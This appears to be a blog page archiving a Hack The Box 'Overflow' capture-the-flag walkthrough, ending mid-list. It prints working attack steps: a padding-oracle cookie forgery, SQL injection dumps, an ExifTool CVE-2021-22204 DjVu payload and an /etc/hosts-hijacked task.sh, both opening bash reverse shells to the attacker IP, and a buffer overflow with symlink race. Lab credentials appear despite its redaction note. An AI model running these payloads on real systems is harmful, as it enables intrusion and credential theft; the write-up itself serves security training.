@@ -1,0 +1,482 @@
+1:"$Sreact.fragment"
+2:I[2509,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],""]
+3:I[6621,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],"MobileNavigation"]
+f:I[6025,[],"OutletBoundary"]
+10:"$Sreact.suspense"
+:HL["/writing/covers/hackthebox-overflow-walkthrough.webp","image"]
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","a","/research",{"href":"/research","children":"Research"}],["$","a","/services",{"href":"/services","children":"Services"}],["$","a","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","a","/projects",{"href":"/projects","children":"Projects"}],["$","a","/about",{"href":"/about","children":"About"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an enquiry ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Overflow Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box Overflow machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T12:21:01.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[17," minutes"]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-overflow-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Overflow machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Overflow machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/overflow","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/3e9b4c98ae2ff28e2557280be131c340ae1654ed/HTB-Overflow.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep"," · 3e9b4c98ae2f",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Overflow"," · Linux"," · Hard"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/overflow","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ","$L4"]}]]}],["$L5","$L6","$L7"]]}],"$L8"]}]]}],"$L9"]}],"$La","$Lb"],null,"$Lc"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"65jXSdzueZKnFbMeYrtpi"}
+4:["$","span",null,{"aria-hidden":"true","children":"↗"}]
+5:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Overflow machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
+6:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+7:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"20 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
+d:T7c85,
+<p><strong>Target IP:</strong> <code>10.129.11.189</code><br /><strong>Attacker IP (Kali):</strong> <code>10.10.16.84</code><br /><strong>Difficulty:</strong> Hard<br /><strong>OS:</strong> Linux (Ubuntu 18.04)</p>
+<hr />
+
+
+
+<h2 id="introduction-and-mindset">Introduction &amp; Mindset</h2>
+<p>Before touching the target, remember: <strong>every piece of information is a clue.</strong> Hard boxes like Overflow are not about finding one glaring vulnerability — they are about chaining multiple small weaknesses together. The mindset is:</p>
+<blockquote>
+<p><em>"What looks normal but behaves strangely? What can I manipulate? What trusts me more than it should?"</em></p>
+</blockquote>
+<p>Overflow teaches:</p>
+<ul>
+<li><strong>Cryptographic failures</strong> (padding oracles)</li>
+<li><strong>Injection attacks</strong> (SQLi)</li>
+<li><strong>Application misconfigurations</strong> (ExifTool RCE)</li>
+<li><strong>Password reuse</strong> (lateral movement)</li>
+<li><strong>Race conditions</strong> (TOCTOU privilege escalation)</li>
+</ul>
+<p>Each step builds on the last. If you get stuck, re-read every error message, every response header, and every cookie. The box talks to you — you just have to listen.</p>
+<hr />
+<h2 id="step-1-initial-reconnaissance">Step 1: Initial Reconnaissance</h2>
+<h3 id="what-we-did">What We Did</h3>
+<pre><code class="language-bash" data-language="bash"># Add the target to /etc/hosts early — we know HTB machines often use vhosts
+echo "10.129.11.189 overflow.htb" | sudo tee -a /etc/hosts
+
+# Full port scan
+nmap -p- --min-rate 10000 10.129.11.189
+
+# Service/version detection on discovered ports
+nmap -sC -sV -p 22,25,80 10.129.11.189
+</code></pre>
+<h3 id="output">Output</h3>
+<pre><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5
+25/tcp open  smtp    Postfix smtpd
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+</code></pre>
+<h3 id="hacker-mindset">Hacker Mindset</h3>
+<p><strong>Why add to <code>/etc/hosts</code> immediately?</strong></p>
+<p>Many web applications behave differently when accessed via IP vs. via hostname. Virtual hosts (vhosts) are common on HTB. If we only ever visit <code>http://10.129.11.189</code>, we might miss entire subdomains or applications that rely on the <code>Host:</code> header. Adding <code>overflow.htb</code> now saves time later.</p>
+<p><strong>Why scan all ports first?</strong></p>
+<p>If we only scanned top 1000 ports, we might miss non-standard services. <code>--min-rate 10000</code> speeds things up. We found SMTP (25) — this tells us the box can send/receive email. Keep that in the back of your mind; it might be useful for phishing or username enumeration later.</p>
+<p><strong>Why note the Apache version?</strong></p>
+<p>Apache 2.4.29 on Ubuntu strongly suggests <strong>Ubuntu 18.04 Bionic</strong>. This helps us estimate what packages, kernels, and vulnerabilities might exist. It sets the "era" of the machine.</p>
+<hr />
+<h2 id="step-2-web-enumeration-and-cookie-analysis">Step 2: Web Enumeration &amp; Cookie Analysis</h2>
+<h3 id="what-we-did-2">What We Did</h3>
+<p>Visited <code>http://10.129.11.189</code> (and <code>http://overflow.htb</code>) and observed:</p>
+<ul>
+<li>A security company landing page</li>
+<li>Login and Register functionality</li>
+<li>A "Contact Us" form (non-functional)</li>
+</ul>
+<p>Registered an account:</p>
+<pre><code class="language-bash" data-language="bash">curl -s -c /tmp/ovf_cookies.txt -X POST http://10.129.11.189/register.php \
+  -d "username=testuser&amp;password=REDACTED -L
+</code></pre>
+<p>Observed the <code>auth</code> cookie:</p>
+<pre><code>auth=REDACTED
+</code></pre>
+<h3 id="hacker-mindset-2">Hacker Mindset</h3>
+<p><strong>Why register an account?</strong></p>
+<p>Because authenticated attack surface is always larger than unauthenticated. Many vulnerabilities (IDOR, privilege escalation, additional endpoints) only appear after login. Also, the registration process itself might leak information.</p>
+<p><strong>Why analyze the cookie?</strong></p>
+<p>The cookie is REDACTED session identifier. If we can understand how it's generated, we might be able to forge it, decrypt it, or predict it. Let's look at the clues:</p>
+<ol>
+<li><strong>Length changes with username length</strong> — this means the username is <em>inside</em> the cookie.</li>
+<li><strong>Length jumps in multiples of 8</strong> — this is the hallmark of a <strong>block cipher</strong> (likely DES, 3DES, or Blowfish with 8-byte blocks).</li>
+<li><strong>Cookie is REDACTED every login</strong> — this suggests an <strong>Initialization Vector (IV)</strong> is being used.</li>
+</ol>
+<p>We hypothesize the structure: <code>IV (8 bytes) + plaintext + padding</code>. The plaintext is likely something like <code>user=testuser</code>.</p>
+<p><strong>Why does this matter?</strong></p>
+<p>If the encryption uses CBC mode and the application leaks padding information, we have a <strong>Padding Oracle Attack</strong>. This allows us to decrypt the cookie without knowing the key, and even forge new cookies.</p>
+<hr />
+<h2 id="step-3-padding-oracle-attack-becoming-admin">Step 3: Padding Oracle Attack — Becoming Admin</h2>
+<h3 id="what-we-did-3">What We Did</h3>
+<p>We modified the cookie (removed the last character) and observed the response:</p>
+<pre><code>&lt;span class=error&gt;Unable to Verify cookie! Invalid padding. Please login Again&lt;/span&gt;
+</code></pre>
+<p><strong>"Invalid padding" is the smoking gun.</strong> The application tells us when padding is wrong. This is a classic padding oracle.</p>
+<p>We used <strong>PadBuster</strong> to automate the attack:</p>
+<pre><code class="language-bash" data-language="bash"># Step 1: Decrypt the cookie
+padbuster http://10.129.11.189/home/index.php \
+  8phnBfSiM4L0SDWBTyZtSTSRxhdPFFqI 8 \
+  -cookie auth=REDACTED
+</code></pre>
+<p>When prompted for the error condition, we selected the response that indicated failure (the <code>302</code> redirect to <code>../logout.php?err=1</code>), which was ID <strong>2</strong>.</p>
+<p><strong>Decrypted value:</strong> <code>user=testuser</code></p>
+<p>Then we encrypted a new cookie with <code>user=admin</code>:</p>
+<pre><code class="language-bash" data-language="bash">padbuster http://10.129.11.189/home/index.php \
+  8phnBfSiM4L0SDWBTyZtSTSRxhdPFFqI 8 \
+  -cookie auth=REDACTED \
+  -plaintext user=admin
+</code></pre>
+<p><strong>New encrypted cookie:</strong> REDACTED</p>
+<p>We replaced our browser cookie with this value and refreshed. Boom — <strong>Admin Panel</strong> link appeared.</p>
+<h3 id="hacker-mindset-3">Hacker Mindset</h3>
+<p><strong>What is a Padding Oracle?</strong></p>
+<p>In CBC mode block ciphers, plaintext is padded to fill the final block. When decrypting, if the padding is invalid, the application should ideally return a generic error. But if it returns a <em>different</em> error (or behavior) for invalid padding vs. invalid data, we can exploit this.</p>
+<p>By systematically modifying bytes in the ciphertext and observing the response, we can:</p>
+<ol>
+<li><strong>Decrypt</strong> the original plaintext byte-by-byte</li>
+<li><strong>Encrypt</strong> arbitrary plaintext by chaining blocks together</li>
+</ol>
+<p><strong>Why target <code>user=admin</code>?</strong></p>
+<p>The decrypted cookie revealed the format: <code>user=&lt;username&gt;</code>. If we can forge <code>user=admin</code>, we inherit administrative privileges without ever knowing the encryption key. This is the power of a padding oracle — it bypasses authentication entirely.</p>
+<p><strong>Why use PadBuster instead of doing it manually?</strong></p>
+<p>A manual padding oracle requires hundreds of requests per byte. For a 2-block cookie, that's ~256 × 16 = 4,096 requests. PadBuster automates the response analysis and brute-forcing. Always use the right tool for the job.</p>
+<hr />
+<h2 id="step-4-sql-injection-in-logs-panel">Step 4: SQL Injection in Logs Panel</h2>
+<h3 id="what-we-did-4">What We Did</h3>
+<p>As admin, we noticed a request in the browser's Network tab:</p>
+<pre><code>GET http://overflow.htb/home/logs.php?name=admin
+</code></pre>
+<p>Accessing it returned login timestamps:</p>
+<pre><code class="language-html" data-language="html">&lt;div id='last'&gt;Last login : 10:00:00&lt;/div&gt;&lt;br&gt;
+</code></pre>
+<p>We tested for SQL injection:</p>
+<pre><code class="language-bash" data-language="bash"># Normal request
+curl -s -b "auth=REDACTED "http://overflow.htb/home/logs.php?name=admin"
+
+# Injection test — returns more results
+curl -s -b "auth=REDACTED \
+  "http://overflow.htb/home/logs.php?name=admin')%20or%201=1%20--%20-"
+</code></pre>
+<p>The <code>OR 1=1</code> payload returned <strong>all</strong> login records, confirming SQL injection.</p>
+<p>We then used <strong>sqlmap</strong> to automate exploitation:</p>
+<pre><code class="language-bash" data-language="bash">sqlmap --url "http://overflow.htb/home/logs.php?name=admin" \
+  --cookie "auth=REDACTED \
+  --batch --dbs
+</code></pre>
+<h3 id="hacker-mindset-4">Hacker Mindset</h3>
+<p><strong>Why look at the Network tab?</strong></p>
+<p>When you gain a new privilege level (admin), the frontend may hide features but the browser still fetches data. The Network tab reveals requests that aren't obvious in the UI. Here, the "Logs" popup was broken, but the underlying API call (<code>logs.php?name=admin</code>) was functional.</p>
+<p><strong>Why test <code>admin'</code> and <code>admin')</code>?</strong></p>
+<p>SQL injection comes in many flavors. The query might be:</p>
+<pre><code class="language-sql" data-language="sql">SELECT login_times FROM logins WHERE username = 'admin'
+</code></pre>
+<p>Or it might be:</p>
+<pre><code class="language-sql" data-language="sql">SELECT login_times FROM logins WHERE username = ('admin')
+</code></pre>
+<p>If the query uses parentheses, a simple <code>admin'--</code> won't work because the closing parenthesis is unmatched. We had to use <code>admin')--</code> to balance the syntax. This is why we test multiple payloads systematically.</p>
+<p><strong>Why use sqlmap after manual confirmation?</strong></p>
+<p>Manual SQLi is fine for proof-of-concept, but dumping entire databases by hand is tedious. Sqlmap handles database fingerprinting, table enumeration, and data extraction automatically. Always confirm the injection manually first (to save time if sqlmap fails), then let the tool do the heavy lifting.</p>
+<hr />
+<h2 id="step-5-dumping-databases-and-cracking-hashes">Step 5: Dumping Databases &amp; Cracking Hashes</h2>
+<h3 id="what-we-did-5">What We Did</h3>
+<p>Sqlmap revealed 4 databases. We focused on <code>cmsmsdb</code> (CMS Made Simple):</p>
+<pre><code class="language-bash" data-language="bash"># Dump CMS users table
+sqlmap --url "http://overflow.htb/home/logs.php?name=admin" \
+  --cookie "auth=REDACTED \
+  -D cmsmsdb -T cms_users --dump
+
+# Dump siteprefs table (contains salt)
+sqlmap --url "http://overflow.htb/home/logs.php?name=admin" \
+  --cookie "auth=REDACTED \
+  -D cmsmsdb -T cms_siteprefs --dump
+</code></pre>
+<p><strong>Results:</strong></p>
+<ul>
+<li><code>admin</code> hash: <code>[redacted retired-lab hash or flag]</code></li>
+<li><code>editor</code> hash: <code>[redacted retired-lab hash or flag]</code></li>
+<li><strong>Sitemask (salt):</strong> <code>6c2d17f37e226486</code></li>
+</ul>
+<p>We researched CMS Made Simple's password algorithm and discovered it uses:</p>
+<pre><code>md5(sitemask + password)
+</code></pre>
+<p>We created a hashcat-compatible file and cracked it:</p>
+<pre><code class="language-bash" data-language="bash">cat &gt; hashes.txt &lt;&lt; 'EOF'
+[redacted retired-lab hash or flag]:6c2d17f37e226486
+[redacted retired-lab hash or flag]:6c2d17f37e226486
+EOF
+
+hashcat -m 20 hashes.txt /usr/share/wordlists/rockyou.txt
+</code></pre>
+<p><strong>Result:</strong> <code>editor</code> password = REDACTED</p>
+<h3 id="hacker-mindset-5">Hacker Mindset</h3>
+<p><strong>Why couldn't we crack the hash with standard MD5?</strong></p>
+<p>Because CMS Made Simple uses a <strong>site-wide salt</strong> (<code>sitemask</code>) prepended to passwords before hashing. This means:</p>
+<ul>
+<li>Rainbow tables are useless</li>
+<li>Generic MD5 wordlists won't work</li>
+<li>We MUST know the salt to crack the hash</li>
+</ul>
+<p>This is why we dumped <code>cms_siteprefs</code> — it stores application configuration, including cryptographic salts.</p>
+<p><strong>Why did only <code>editor</code> crack?</strong></p>
+<p>The <code>admin</code> password was either not in <code>rockyou.txt</code> or was stronger. But on HTB, one cracked credential is REDACTED enough. The <code>editor</code> account had administrative access to the CMS, which was our next target.</p>
+<p><strong>Why research the application's source code?</strong></p>
+<p>When hashes don't crack with standard methods, the application is doing something non-standard. By looking at CMS Made Simple's source (or documentation), we learned the exact hashing formula. This allowed us to construct the proper hashcat attack (<code>-m 20</code> = <code>md5($salt.$pass)</code>).</p>
+<hr />
+<h2 id="step-6-cms-made-simple-and-vhost-discovery">Step 6: CMS Made Simple &amp; Vhost Discovery</h2>
+<h3 id="what-we-did-6">What We Did</h3>
+<p>Logged into CMS Made Simple at:</p>
+<pre><code>http://overflow.htb/admin_cms_panel/admin/login.php
+</code></pre>
+<p>Credentials: <code>editor</code> / <code>alpha!@#$%bravo</code></p>
+<p>Navigated to <strong>Extensions → User Defined Tags</strong> and found:</p>
+<blockquote>
+<p>"Make sure you check out devbuild-job.overflow.htb and report any UI related problems to developer, use the editor account to authenticate."</p>
+</blockquote>
+<p>Added the new vhost:</p>
+<pre><code class="language-bash" data-language="bash">echo "10.129.11.189 devbuild-job.overflow.htb" | sudo tee -a /etc/hosts
+</code></pre>
+<p>Visited <code>http://devbuild-job.overflow.htb</code>, logged in with the <strong>same credentials</strong>, and found a resume upload form accepting <code>.tiff</code>, <code>.jpeg</code>, <code>.jpg</code>.</p>
+<h3 id="hacker-mindset-6">Hacker Mindset</h3>
+<p><strong>Why check Extensions / User Defined Tags?</strong></p>
+<p>CMS extensions and custom tags are often written by administrators and may contain hardcoded credentials, comments, or hints about the infrastructure. Developers leave notes for themselves. In this case, the tag literally told us about a hidden subdomain and which credentials to use.</p>
+<p><strong>Why reuse the same password?</strong></p>
+<p>Password reuse is one of the most common vulnerabilities in real-world environments. If <code>editor</code> uses <code>alpha!@#$%bravo</code> for the CMS, there's a good chance they use it elsewhere. Always try credential reuse across every service, panel, and subdomain you discover.</p>
+<p><strong>Why does the upload form matter?</strong></p>
+<p>File uploads are high-value targets. If the application processes uploaded files with external tools (like ExifTool for metadata extraction), any vulnerability in those tools becomes a vulnerability in the web application. We need to determine what happens after upload.</p>
+<hr />
+<h2 id="step-7-cve-2021-22204-exiftool-rce">Step 7: CVE-2021-22204 — ExifTool RCE</h2>
+<h3 id="what-we-did-7">What We Did</h3>
+<p>After uploading a test image, we inspected the page source and found:</p>
+<pre><code class="language-html" data-language="html">&lt;!-- In exiftool condition --&gt;
+</code></pre>
+<p>This confirmed the server runs <strong>ExifTool</strong> on uploads. The version was <strong>11.92</strong>, which is vulnerable to <strong>CVE-2021-22204</strong>.</p>
+<p>We created a malicious DjVu file with embedded Perl code:</p>
+<pre><code class="language-bash" data-language="bash"># Install required tool
+sudo apt-get install -y djvulibre-bin
+
+# Create payload
+cat &gt; exploit &lt;&lt; 'EOF'
+(metadata
+(Copyright "\
+" . qx{/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.84/4444 0&gt;&amp;1'} . \
+" b ") )
+EOF
+
+# Build malicious DjVu
+djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=exploit
+
+# Rename to .jpg for upload
+mv exploit.djvu exploit.jpg
+</code></pre>
+<p>Started a listener on Kali:</p>
+<pre><code class="language-bash" data-language="bash">nc -lnvp 4444
+</code></pre>
+<p>Uploaded <code>exploit.jpg</code>. Within seconds, we received a reverse shell.</p>
+<h3 id="hacker-mindset-7">Hacker Mindset</h3>
+<p><strong>What is CVE-2021-22204?</strong></p>
+<p>ExifTool is a popular Perl library for reading/writing image metadata. In versions before 12.24, it incorrectly evaluated DjVu annotation strings as Perl code. An attacker could embed a malicious DjVu file inside another image format, and when ExifTool processed it, arbitrary Perl (and thus system) commands would execute.</p>
+<p><strong>Why DjVu inside a JPG?</strong></p>
+<p>The upload form only accepts <code>.jpg</code>, <code>.jpeg</code>, <code>.tiff</code>. But ExifTool determines file type by <strong>content</strong>, not extension. A file named <code>.jpg</code> containing DjVu metadata is still processed by the DjVu parser. This is a classic case of trusting user input (the filename) while the backend processes content.</p>
+<p><strong>Why use <code>djvumake</code>?</strong></p>
+<p>DjVu is a complex format. <code>djvumake</code> allows us to construct a minimal DjVu file with an <code>ANTa</code> (annotation) chunk containing our Perl payload. The <code>INFO=0,0</code> and <code>BGjp=/dev/null</code> create just enough structure for ExifTool to recognize and parse it.</p>
+<p><strong>Why a reverse shell and not a direct command?</strong></p>
+<p>A reverse shell gives us interactive access. If we just ran <code>whoami &gt; /tmp/pwned</code>, we'd have to find a way to read the output. A reverse shell is a full session we can work with.</p>
+<hr />
+<h2 id="step-8-shell-as-www-data">Step 8: Shell as www-data</h2>
+<h3 id="what-we-did-8">What We Did</h3>
+<p>Caught the reverse shell:</p>
+<pre><code>connect to [10.10.16.84] from (UNKNOWN) [10.129.11.189] 34348
+bash: cannot set terminal process group (1209): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@overflow:~/devbuild-job/home/profile$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<h3 id="hacker-mindset-8">Hacker Mindset</h3>
+<p><strong>What do we do first with a new shell?</strong></p>
+<ol>
+<li><strong>Stabilize it</strong> — <code>script /dev/null -c bash</code> gives us a TTY</li>
+<li><strong>Enumerate</strong> — <code>id</code>, <code>whoami</code>, <code>hostname</code>, <code>uname -a</code></li>
+<li><strong>Look for credentials</strong> — Web applications almost always store database credentials in config files. These are gold for lateral movement.</li>
+</ol>
+<p>We immediately checked <code>/var/www/html/config/</code> and <code>/var/www/devbuild-job/config/</code> because web configs are the lowest-hanging fruit for credential harvesting.</p>
+<hr />
+<h2 id="step-9-lateral-movement-to-developer">Step 9: Lateral Movement to developer</h2>
+<h3 id="what-we-did-9">What We Did</h3>
+<p>Found database credentials in <code>/var/www/html/config/db.php</code>:</p>
+<pre><code class="language-php" data-language="php">$lnk = mysqli_connect("localhost","developer", "sh@tim@n","Overflow");
+</code></pre>
+<p>Same password found in <code>/var/www/devbuild-job/config/db.php</code> and <code>/var/www/html/admin_cms_panel/config.php</code>.</p>
+<p>We used the password to switch users:</p>
+<pre><code class="language-bash" data-language="bash">su - developer
+# Password: null
+</code></pre>
+<p>Confirmed with <code>id</code>:</p>
+<pre><code>uid=1001(developer) gid=1001(developer) groups=1001(developer),1002(network)
+</code></pre>
+<h3 id="hacker-mindset-9">Hacker Mindset</h3>
+<p><strong>Why does password reuse happen?</strong></p>
+<p>Developers and sysadmins often reuse passwords across services to simplify management. From an attacker's perspective, one compromised credential is REDACTED skeleton key. Always check:</p>
+<ul>
+<li>Web config files (<code>config.php</code>, <code>db.php</code>, <code>.env</code>)</li>
+<li>Backup files</li>
+<li>Source code repositories</li>
+<li>Environment variables</li>
+</ul>
+<p><strong>Why note the <code>network</code> group?</strong></p>
+<p>The <code>id</code> output showed <code>groups=1001(developer),1002(network)</code>. Any unexpected group membership is interesting. We immediately asked: <em>"What files does the <code>network</code> group own or have write access to?"</em> This led us directly to <code>/etc/hosts</code>.</p>
+<hr />
+<h2 id="step-10-lateral-movement-to-tester">Step 10: Lateral Movement to tester</h2>
+<h3 id="what-we-did-10">What We Did</h3>
+<p>Enumerated files accessible to the <code>network</code> group:</p>
+<pre><code class="language-bash" data-language="bash">find / -group network -ls 2&gt;/dev/null
+</code></pre>
+<p>Found <code>/etc/hosts</code> is writable by <code>network</code>:</p>
+<pre><code>-rwxrw-r-- 1 root network 201 Sep 30 06:00 /etc/hosts
+</code></pre>
+<p>Discovered <code>/opt/commontask.sh</code> (readable via ACL):</p>
+<pre><code class="language-bash" data-language="bash">cat /opt/commontask.sh
+</code></pre>
+<p>Content:</p>
+<pre><code class="language-bash" data-language="bash">#!/bin/bash
+bash &lt; &lt;(curl -s http://taskmanage.overflow.htb/task.sh)
+</code></pre>
+<p>This script runs every minute and downloads <code>task.sh</code> from <code>taskmanage.overflow.htb</code>.</p>
+<p>We poisoned <code>/etc/hosts</code>:</p>
+<pre><code class="language-bash" data-language="bash">echo -e "10.10.16.84\ttaskmanage.overflow.htb" &gt;&gt; /etc/hosts
+</code></pre>
+<p>On Kali, we hosted a malicious <code>task.sh</code>:</p>
+<pre><code class="language-bash" data-language="bash">mkdir -p /tmp/overflow &amp;&amp; cd /tmp/overflow
+cat &gt; task.sh &lt;&lt; 'EOF'
+#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/10.10.16.84/7777 0&gt;&amp;1
+EOF
+sudo python3 -m http.server 80
+</code></pre>
+<p>Started a listener:</p>
+<pre><code class="language-bash" data-language="bash">nc -lnvp 7777
+</code></pre>
+<p>Within a minute, we caught a shell as <code>tester</code>.</p>
+<h3 id="hacker-mindset-10">Hacker Mindset</h3>
+<p><strong>Why is /etc/hosts powerful?</strong></p>
+<p><code>/etc/hosts</code> is the first place the OS looks for DNS resolution. If we can write to it, we can redirect any domain to any IP. This is a <strong>DNS hijack</strong> at the local level. The cron job trusts <code>taskmanage.overflow.htb</code> — we simply told the machine that <em>we</em> are that domain.</p>
+<p><strong>Why check ACLs (getfacl)?</strong></p>
+<p>Standard Unix permissions (<code>ls -la</code>) only show owner/group/others. But <strong>Access Control Lists (ACLs)</strong> can grant permissions to specific users or groups. <code>commontask.sh</code> showed <code>---</code> for "others", but <code>getfacl</code> revealed <code>developer</code> had <code>r-x</code> access. Always use <code>getfacl</code> when you see a <code>+</code> in <code>ls -la</code> permissions.</p>
+<p><strong>Why not modify commontask.sh directly?</strong></p>
+<p>Because we only had <code>r-x</code> (read + execute), not <code>w</code> (write). We couldn't edit the script, but we could control what it <em>fetched</em>.</p>
+<p><strong>Why use port 80 for the web server?</strong></p>
+<p>The cron script uses <code>http://taskmanage.overflow.htb/task.sh</code> — no port specified means <strong>port 80</strong>. If we served on port 8080, the request would fail. Since we controlled the target's DNS resolution via <code>/etc/hosts</code>, we just needed to listen on the port the script expected.</p>
+<hr />
+<h2 id="step-11-privilege-escalation-to-root">Step 11: Privilege Escalation to root</h2>
+<h3 id="what-we-did-11">What We Did</h3>
+<p>As <code>tester</code>, we found <code>/opt/file_encrypt/</code>:</p>
+<pre><code class="language-bash" data-language="bash">ls -la /opt/file_encrypt/
+</code></pre>
+<ul>
+<li><code>file_encrypt</code> — <strong>setuid root</strong>, 32-bit ELF</li>
+<li><code>README.md</code> — mentions a PIN feature</li>
+</ul>
+<p>Running it:</p>
+<pre><code class="language-bash" data-language="bash">/opt/file_encrypt/file_encrypt
+</code></pre>
+<p>Output:</p>
+<pre><code>This is the code 1804289383. Enter the Pin:
+</code></pre>
+<h3 id="analysis-with-gdb">Analysis with GDB</h3>
+<pre><code class="language-bash" data-language="bash">gdb -q /opt/file_encrypt/file_encrypt
+(gdb) b main
+(gdb) r
+(gdb) p encrypt
+$1 = {&lt;text variable, no debug info&gt;} 0x5655585b &lt;encrypt&gt;
+</code></pre>
+<p><strong>Key findings from reversing:</strong></p>
+<ol>
+<li><code>rand()</code> is never seeded with <code>srand()</code>, so it always produces the same sequence</li>
+<li>The "random" PIN is deterministic: <code>random = 0x6b8b4567 * 0x59^10 + ...</code> XORed with the code</li>
+<li>As a <strong>signed 32-bit integer</strong>, the PIN is: <strong><code>-202976456</code></strong></li>
+<li>After correct PIN, <code>scanf("%s", user_name)</code> reads into a <strong>20-byte buffer</strong> with no bounds checking</li>
+<li>The return address is at offset <strong>44 bytes</strong></li>
+<li>The <code>encrypt</code> function address is <code>0x5655585b</code> (little-endian: <code>\x5b\x58\x55\x56</code>)</li>
+</ol>
+<h3 id="the-toctou-race-condition">The TOCTOU Race Condition</h3>
+<p>The <code>encrypt</code> function does this:</p>
+<pre><code class="language-c" data-language="c">stat(user_infile, &amp;stat_struct);
+if (stat_struct.st_uid == 0) {
+    fprintf(stderr,"File %s is owned by root\n",user_infile);
+    exit(1);
+}
+sleep(3);  // &lt;-- THE RACE WINDOW
+fd_input = fopen(user_infile,"rb");
+</code></pre>
+<p>It checks if the file is owned by root, <strong>sleeps 3 seconds</strong>, then opens it. This is a <strong>Time-of-Check to Time-of-Use (TOCTOU)</strong> vulnerability.</p>
+<h3 id="exploit-setup">Exploit Setup</h3>
+<p><strong>Exploit script (<code>/tmp/sploit.py</code>):</strong></p>
+<pre><code class="language-python" data-language="python">#!/usr/bin/env python3
+import sys
+print("-202976456")
+print("A"*44 + "\x5b\x58\x55\x56")
+print(sys.argv[1])
+print(sys.argv[2])
+</code></pre>
+<p><strong>Race loop (<code>/tmp/0xdf</code>):</strong></p>
+<pre><code class="language-bash" data-language="bash">mkdir -p /tmp/0xdf
+cd /tmp/0xdf
+
+while :; do 
+    rm -f l; 
+    ln -sf /root/root.txt l; 
+    sleep 3; 
+    rm -f l; 
+    echo "oops" &gt; l; 
+    sleep 3; 
+done
+</code></pre>
+<p>This loop toggles <code>l</code> between:</p>
+<ul>
